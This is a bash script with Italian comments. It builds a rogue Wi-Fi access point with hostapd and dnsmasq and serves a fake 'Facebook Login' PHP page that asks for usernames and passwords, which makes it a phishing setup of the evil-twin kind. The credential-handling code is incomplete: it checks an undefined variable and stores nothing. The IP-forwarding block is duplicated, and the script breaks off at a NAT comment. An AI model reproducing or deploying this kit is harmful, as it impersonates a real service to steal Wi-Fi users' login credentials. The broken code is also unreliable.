#!/bin/bash

# Installazione dei pacchetti necessari
apt-get update
apt-get install hostapd dnsmasq apache2 php -y

# Configurazione del file hostapd.conf
cat > /etc/hostapd/hostapd.conf << EOL
interface=wlan0
ssid=MyAccessPoint
driver=nl80211
hw_mode=g
channel=7
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=MyPassphrase
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
EOL

# Configurazione del file dnsmasq.conf
cat > /etc/dnsmasq.conf << EOL
interface=wlan0
dhcp-range=192.168.4.2,192.168.4.20,255.255.255.0,24h
EOL

# Configurazione del file index.php per la pagina di login di Facebook
cat > /var/www/html/index.php << EOL
<?php
\$username = \$_POST['username'];
\$password = \$_POST['password'];

if (\$username && \$password) {
    // Verifica delle credenziali con Facebook (puoi personalizzare questa parte)

    if (\$valid_credentials) {
        // Reindirizza l'utente a una pagina di successo o alla sua destinazione desiderata
        header("Location: success.html");
    } else {
        // Reindirizza l'utente a una pagina di errore o mostra un messaggio di errore
        header("Location: error.html");
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Facebook Login</title>
</head>
<body>
    <h1>Facebook Login</h1>
    <form method="post" action="">
        <label for="username">Username:</label>
        <input type="text" name="username" id="username" required><br><br>
        <label for="password">Password:</label>
        <input type="password" name="password" id="password" required><br><br>
        <input type="submit" value="Log In">
    </form>
</body>
</html>
EOL

# Configurazione del file sysctl.conf per abilitare l'IP forwarding
sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/' /etc/sysctl.conf
echo 1 > /proc/sys/net/ipv4/ip_forward

# Configurazione dell'interfaccia wlan1 per connettersi a Internet
cat > /etc/network/interfaces.d/wlan1 << EOL
allow-hotplug wlan1
iface wlan1 inet dhcp
wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf
EOL

# Configurazione del file sysctl.conf per abilitare l'IP forwarding
sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/' /etc/sysctl.conf
echo 1 > /proc/sys/net/ipv4/ip_forward

# Configurazione del NAT per inoltrare il traffico